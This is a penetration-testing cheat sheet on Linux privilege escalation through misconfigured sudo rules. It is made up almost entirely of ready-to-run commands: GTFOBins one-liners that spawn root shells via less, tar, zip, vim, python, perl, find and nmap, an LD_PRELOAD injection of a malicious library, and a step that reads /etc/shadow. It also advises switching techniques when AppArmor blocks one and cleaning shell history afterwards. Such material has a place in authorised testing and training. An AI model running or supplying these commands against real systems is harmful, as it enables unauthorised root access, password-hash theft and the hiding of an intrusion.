
# Sudo Abuse  

Misconfigured sudo rules are one of the most reliable escalation paths.  
Always start here after basic enumeration.

---

## 1. Check Sudo Rights

```bash
sudo -l
````

Look for:

* `NOPASSWD`
* editable programs (vim, nano)
* pagers (less, more)
* file extractors (tar, zip, unzip)
* scripting languages (python, perl)
* service managers (systemctl)
* package managers (apt, yum)

Any of these = escalation.

---

## 2. Common Escalation Paths (GTFOBins)

### **less (via apt-get changelog)**

```bash
sudo apt-get changelog apt
# inside less:
!bash
```

### **tar**

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### **zip**

```bash
sudo zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"
```

### **vim**

```bash
sudo vim -c ':!/bin/bash'
```

### **python**

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### **perl**

```bash
sudo perl -e 'exec "/bin/bash";'
```

### **find**

```bash
sudo find . -exec /bin/bash \; -quit
```

### **nmap (interactive mode)**

```bash
sudo nmap --interactive
!sh
```

---

## 3. If Sudo Requires a Password

Check usable programs allowed **after** authentication:

```bash
sudo -l
```

Even if the user needs a password, many tools still escalate once launched.

---

## 4. Environment Variables (LD_PRELOAD / LD_LIBRARY_PATH)

If allowed (rare):

```bash
sudo LD_PRELOAD=/tmp/shell.so program
```

This injects your malicious .so file into a privileged binary.

---

## 5. AppArmor & Logging Checks

If escalation fails or binaries behave strangely:

Check AppArmor:

```bash
aa-status
```

Check syslog for denials:

```bash
cat /var/log/syslog | grep DENIED
```

Check kernel logs:

```bash
dmesg | grep -i denied
```

If AppArmor blocks a GTFOBins technique, try a different binary.

---

## 6. Validate PrivEsc

After escalation:

```bash
whoami
id
```

Then capture evidence (lab only):

```bash
cat /etc/shadow  # DO NOT RUN on real clients
```

---

## 7. Operator Checklist

* [ ] Run `sudo -l`
* [ ] Identify interactive or file-manipulating programs
* [ ] Pick one GTFOBins technique and validate
* [ ] Check AppArmor if blocked
* [ ] Clean up (history, temp files)

---

**Sudo misconfigs → instant escalation.**

